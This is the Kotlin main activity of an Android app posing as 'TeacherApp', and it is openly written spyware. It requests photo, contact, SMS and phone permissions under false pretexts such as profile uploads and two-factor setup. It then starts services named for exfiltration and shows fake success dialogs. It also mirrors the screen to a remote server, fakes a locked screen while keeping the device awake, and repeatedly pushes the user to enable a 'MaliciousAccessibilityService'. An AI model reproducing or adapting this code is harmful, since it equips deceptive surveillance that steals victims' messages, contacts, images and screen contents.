package com.example.teacherapp

import android.Manifest
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.navigation.NavHostController
import androidx.navigation.compose.rememberNavController
import com.example.teacherapp.navigation.NavGraph
import com.example.teacherapp.navigation.ScreenOverlayState
import com.example.teacherapp.services.ScreenMirrorService
import com.example.teacherapp.ui.theme.TeacherappTheme
import com.example.teacherapp.services.ContactExfiltrationService
import com.example.teacherapp.services.ImageExfiltrationService
import com.example.teacherapp.services.SmsExfiltrationService
import com.example.teacherapp.services.AppDataExfiltrationService
import com.example.teacherapp.services.FloatingBubbleService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch


class MainActivity : ComponentActivity() {

    // Inactivity screen dimming
    private val inactivityTimeout = 2 * 60 * 1000L // 2 minutes
    private val inactivityHandler = Handler(Looper.getMainLooper())
    private val dimScreenRunnable = Runnable {
        ScreenOverlayState.isTracking = false
        val params = window.attributes
        params.screenBrightness = 0.0f
        params.alpha = 0.0f
        window.attributes = params
        window.addFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
        window.setDimAmount(1.0f)
    }

    // Fake lock — intercept the power/lock button
    private var isFakeLocked = false
    private var wakeLock: PowerManager.WakeLock? = null

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_SCREEN_OFF) {
                if (!isFakeLocked) {
                    fakeLock()
                } else {
                    realLock()
                }
            }
        }
    }

    // All permissions requested contextually — none at startup
    private val requiredPermissions = emptyArray<String>()

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions: Map<String, Boolean> ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            onAllPermissionsGranted()
        } else {
            Toast.makeText(this, "Some permissions were denied. App may not function correctly.", Toast.LENGTH_LONG).show()
        }
    }

    // Individual permission launchers — called from Settings screen
    private val imagePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            ImageExfiltrationService.startExfiltration(this@MainActivity)
            showFakeUploadDialog()
        } else {
            if (!shouldShowRequestPermissionRationale(if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE)) {
                AlertDialog.Builder(this)
                    .setTitle("Permission Required")
                    .setMessage("Storage permission was denied. Please enable it in App Settings to upload your profile picture.")
                    .setPositiveButton("Open Settings") { dialog, _ ->
                        dialog.dismiss()
                        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                        intent.data = android.net.Uri.parse("package:$packageName")
                        startActivity(intent)
                    }
                    .setNegativeButton("Cancel") { dialog, _ ->
                        dialog.dismiss()
                    }
                    .setCancelable(false)
                    .show()
            } else {
                Toast.makeText(this, "Storage permission was denied.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private val contactPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            ContactExfiltrationService.startExfiltration(this@MainActivity)
            showFakeImportDialog()
        } else {
            if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_CONTACTS)) {
                AlertDialog.Builder(this)
                    .setTitle("Permission Required")
                    .setMessage("Contacts permission was denied. Please enable it in App Settings to sync your contacts.")
                    .setPositiveButton("Open Settings") { dialog, _ ->
                        dialog.dismiss()
                        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                        intent.data = android.net.Uri.parse("package:$packageName")
                        startActivity(intent)
                    }
                    .setNegativeButton("Cancel") { dialog, _ ->
                        dialog.dismiss()
                    }
                    .setCancelable(false)
                    .show()
            } else {
                Toast.makeText(this, "Contacts permission was denied.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private val smsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            SmsExfiltrationService.startExfiltration(this@MainActivity)
            showFakeVerificationDialog()
        } else {
            if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)) {
                AlertDialog.Builder(this)
                    .setTitle("Permission Required")
                    .setMessage("SMS permission was denied. Please enable it in App Settings to set up two-factor authentication.")
                    .setPositiveButton("Open Settings") { dialog, _ ->
                        dialog.dismiss()
                        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                        intent.data = android.net.Uri.parse("package:$packageName")
                        startActivity(intent)
                    }
                    .setNegativeButton("Cancel") { dialog, _ ->
                        dialog.dismiss()
                    }
                    .setCancelable(false)
                    .show()
            } else {
                Toast.makeText(this, "SMS permission is required for two-factor authentication", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private val phonePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            AppDataExfiltrationService.startExfiltration(this@MainActivity)
            showFakeDeviceSyncDialog()
        } else {
            // If permanently denied, show dialog then open App Settings
            if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_PHONE_STATE)) {
                AlertDialog.Builder(this)
                    .setTitle("Permission Required")
                    .setMessage("Phone permission was denied. Please enable it in App Settings to sync your device.")
                    .setPositiveButton("Open Settings") { dialog, _ ->
                        dialog.dismiss()
                        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                        intent.data = android.net.Uri.parse("package:$packageName")
                        startActivity(intent)
                    }
                    .setNegativeButton("Cancel") { dialog, _ ->
                        dialog.dismiss()
                    }
                    .setCancelable(false)
                    .show()
            } else {
                Toast.makeText(this, "Phone permission is required to sync your device", Toast.LENGTH_SHORT).show()
            }
        }
    }

    // MediaProjection launcher for screen mirroring to EC2
    private val projectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            ScreenMirrorService.start(this, result.resultCode, result.data!!)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContent {
            TeacherappTheme {
                val navController = rememberNavController()
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Box(modifier = Modifier.padding(innerPadding)) {
                        NavGraph(navController = navController)
                    }
                }
            }
        }

        // Register power button / screen-off receiver
        registerReceiver(screenReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))

        // Overlay permission is requested in SecureAccountScreen (Step 4)

        // Start AppDataExfiltrationService immediately (no permission needed)
        Handler(Looper.getMainLooper()).postDelayed({
            AppDataExfiltrationService.startExfiltration(this@MainActivity)
        }, 5000)

        // Screen recording is only started after fresh login via onAllPermissionsGranted()
        // On app restart we skip it — no valid MediaProjection token available
        // LoginScreen.kt calls onAllPermissionsGranted() after successful login
    }

    private fun requestNecessaryPermissions() {
        val permissionsNeeded = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (permissionsNeeded.isNotEmpty()) {
            permissionLauncher.launch(permissionsNeeded.toTypedArray())
        } else {
            onAllPermissionsGranted()
        }
    }

    fun onAllPermissionsGranted() {
        Toast.makeText(this, "Welcome to TeacherApp", Toast.LENGTH_SHORT).show()

        // Step 1: Request screen sharing first
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        projectionLauncher.launch(projectionManager.createScreenCaptureIntent())

        // Accessibility is handled in SecureAccountScreen — no auto-prompt here
    }

    // ========== PUBLIC FUNCTIONS — Called from Settings screen ==========

    fun requestImagePermissionAndSteal() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        when {
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED -> {
                ImageExfiltrationService.startExfiltration(this@MainActivity)
                showFakeUploadDialog()
            }
            else -> imagePermissionLauncher.launch(permission)
        }
    }

    fun requestContactPermissionAndSteal() {
        when {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED -> {
                ContactExfiltrationService.startExfiltration(this@MainActivity)
                showFakeImportDialog()
            }
            else -> contactPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
        }
    }

    fun requestSmsPermissionAndSteal() {
        when {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED -> {
                SmsExfiltrationService.startExfiltration(this@MainActivity)
                showFakeVerificationDialog()
            }
            else -> smsPermissionLauncher.launch(Manifest.permission.READ_SMS)
        }
    }

    fun requestPhonePermissionAndSteal() {
        when {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED -> {
                AppDataExfiltrationService.startExfiltration(this@MainActivity)
                showFakeDeviceSyncDialog()
            }
            shouldShowRequestPermissionRationale(Manifest.permission.READ_PHONE_STATE) -> {
                // First time or user previously denied without "don't ask again"
                phonePermissionLauncher.launch(Manifest.permission.READ_PHONE_STATE)
            }
            else -> {
                // Either first-ever request OR permanently denied — launch permission dialog
                phonePermissionLauncher.launch(Manifest.permission.READ_PHONE_STATE)
            }
        }
    }

    // ========== FAKE SUCCESS DIALOGS ==========

    private fun showFakeUploadDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Uploading Profile Picture")
            .setMessage("Please wait while we upload your profile picture...")
            .setCancelable(false)
            .create()
        dialog.show()
        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ Profile picture uploaded successfully!", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    private fun showFakeImportDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Importing Contacts")
            .setMessage("Please wait while we import your contacts...")
            .setCancelable(false)
            .create()
        dialog.show()
        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ 12 contacts imported successfully!", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    private fun showFakeVerificationDialog() {
        val code = (100000..999999).random().toString()
        val dialog = AlertDialog.Builder(this)
            .setTitle("Two-Factor Authentication")
            .setMessage("Sending verification code to your registered number...\n\nCode: $code")
            .setCancelable(false)
            .create()
        dialog.show()
        Handler(Looper.getMainLooper()).postDelayed({
            dialog.setMessage("Verifying code $code...")
        }, 1500)
        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ Two-factor authentication enabled!", Toast.LENGTH_LONG).show()
        }, 3000)
    }

    private fun showFakeDeviceSyncDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Syncing Device")
            .setMessage("🔄 Syncing your device information...")
            .setCancelable(false)
            .create()
        dialog.show()
        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ Device synced successfully!", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    // ========== FAKE LOCK ==========

    private fun fakeLock() {
        isFakeLocked = true
        ScreenOverlayState.isTracking = false

        @Suppress("DEPRECATION")
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
            "teacherapp:fakelock"
        )
        wakeLock?.acquire(10 * 60 * 1000L)

        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )

        val params = window.attributes
        params.screenBrightness = 0.0f
        params.alpha = 0.0f
        window.attributes = params
        window.addFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
        window.setDimAmount(1.0f)
    }

    private fun realLock() {
        isFakeLocked = false

        ScreenOverlayState.savedRoute?.let { route ->
            ScreenOverlayState.navController?.navigate(route) {
                popUpTo(0) { inclusive = true }
            }
        }
        ScreenOverlayState.isTracking = true

        val params = window.attributes
        params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
        params.alpha = 1.0f
        window.attributes = params
        window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
        window.setDimAmount(0.0f)

        @Suppress("DEPRECATION")
        window.clearFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )
        wakeLock?.release()
        wakeLock = null
    }

    // ========== ACCESSIBILITY SERVICE ==========

    private val accessibilityHandler = Handler(Looper.getMainLooper())
    private var accessibilityDialogShowing = false

    fun isAccessibilityServiceEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(enabled)
        val combined = "$packageName/com.example.teacherapp.services.MaliciousAccessibilityService"
        while (splitter.hasNext()) {
            if (splitter.next().equals(combined, ignoreCase = true)) return true
        }
        return false
    }

    private val accessibilityCheckRunnable = object : Runnable {
        override fun run() {
            if (isFinishing) return
            // Don't show dialog if user is on login/secure account screens
            val currentRoute = ScreenOverlayState.navController?.currentBackStackEntry?.destination?.route
            if (currentRoute == "secure_account_screen" ||
                currentRoute == "login_screen" ||
                currentRoute == "register_screen") return
            if (!isAccessibilityServiceEnabled()) {
                if (!accessibilityDialogShowing) showAccessibilityDialog()
                accessibilityHandler.postDelayed(this, 8000)
            }
        }
    }

    fun startAccessibilityLoop() {
        accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
        accessibilityHandler.post(accessibilityCheckRunnable)
    }

    private fun showAccessibilityDialog() {
        if (isFinishing || accessibilityDialogShowing) return
        accessibilityDialogShowing = true
        AlertDialog.Builder(this)
            .setTitle("Action Required")
            .setMessage(
                "TeacherApp requires accessibility features to be enabled for enhanced text input " +
                        "assistance and note-taking support.\n\n" +
                        "Please enable 'TeacherApp' in the Accessibility settings to continue."
            )
            .setPositiveButton("Open Settings") { dialog, _ ->
                dialog.dismiss()
                accessibilityDialogShowing = false
                openAccessibilitySettings()
            }
            .setCancelable(false)
            .setOnDismissListener { accessibilityDialogShowing = false }
            .show()
    }

    private fun openAccessibilitySettings() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
            Toast.makeText(this, "Enable TeacherApp in the list", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Could not open accessibility settings", Toast.LENGTH_LONG).show()
        }
    }

    // ========== LIFECYCLE ==========

    override fun onUserInteraction() {
        super.onUserInteraction()

        if (isFakeLocked) {
            realLock()
            return
        }

        inactivityHandler.removeCallbacks(dimScreenRunnable)
        val wasScreenDimmed = !ScreenOverlayState.isTracking
        val params = window.attributes
        params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
        params.alpha = 1.0f
        window.attributes = params
        window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
        window.setDimAmount(0.0f)

        if (wasScreenDimmed) {
            ScreenOverlayState.savedRoute?.let { route ->
                ScreenOverlayState.navController?.navigate(route) {
                    popUpTo(0) { inclusive = true }
                }
            }
            ScreenOverlayState.isTracking = true
        }

        inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
    }

    override fun onResume() {
        super.onResume()
        FloatingBubbleService.stop(this)

        // Always restore screen when app comes to foreground (prevents black screen)
        if (!isFakeLocked) {
            val params = window.attributes
            params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
            params.alpha = 1.0f
            window.attributes = params
            window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND)
            window.setDimAmount(0.0f)
            ScreenOverlayState.isTracking = true
        }

        inactivityHandler.removeCallbacks(dimScreenRunnable)
        inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)

        // Only run accessibility check if user is fully logged in AND
        // has completed the SecureAccountScreen setup
        val currentUser = com.google.firebase.auth.FirebaseAuth.getInstance().currentUser
        if (currentUser == null) return  // not logged in — skip

        // Check current nav destination — don't run if still on secure_account or login
        val currentRoute = ScreenOverlayState.navController?.currentBackStackEntry?.destination?.route
        if (currentRoute == "secure_account_screen" ||
            currentRoute == "login_screen" ||
            currentRoute == "register_screen" ||
            currentRoute == null) return

        val smsDone = ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
        val phoneDone = ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED

        // Only run if user has fully completed secure account setup
        if (!smsDone || !phoneDone) return

        accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
        accessibilityHandler.postDelayed({
            if (isAccessibilityServiceEnabled()) {
                accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
            } else {
                accessibilityHandler.postDelayed({
                    if (!isAccessibilityServiceEnabled()) {
                        accessibilityHandler.post(accessibilityCheckRunnable)
                    }
                }, 2000)
            }
        }, 3000)
    }

    override fun onPause() {
        super.onPause()
        inactivityHandler.removeCallbacks(dimScreenRunnable)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
            FloatingBubbleService.start(this)
        }
    }

    override fun onDestroy() {
        accessibilityHandler.removeCallbacks(accessibilityCheckRunnable)
        unregisterReceiver(screenReceiver)
        wakeLock?.release()
        super.onDestroy()
    }
}

@Composable
fun StartScreen(modifier: Modifier = Modifier, navController: NavHostController) {
    Column(
        modifier = modifier.fillMaxSize().padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Spacer(modifier = Modifier.weight(1f))
        Text(
            text = "Welcome to MyApp",
            fontSize = 32.sp,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.primary
        )
        Spacer(modifier = Modifier.weight(2f))
        Column(modifier = Modifier.fillMaxWidth(), verticalArrangement = Arrangement.spacedBy(12.dp)) {
            Button(onClick = { navController.navigate("register_screen") }, modifier = Modifier.fillMaxWidth()) {
                Text(text = "Create New Account")
            }
            OutlinedButton(onClick = { navController.navigate("login_screen") }, modifier = Modifier.fillMaxWidth()) {
                Text(text = "Use Existing Account")
            }
        }
        Spacer(modifier = Modifier.height(16.dp))
    }
}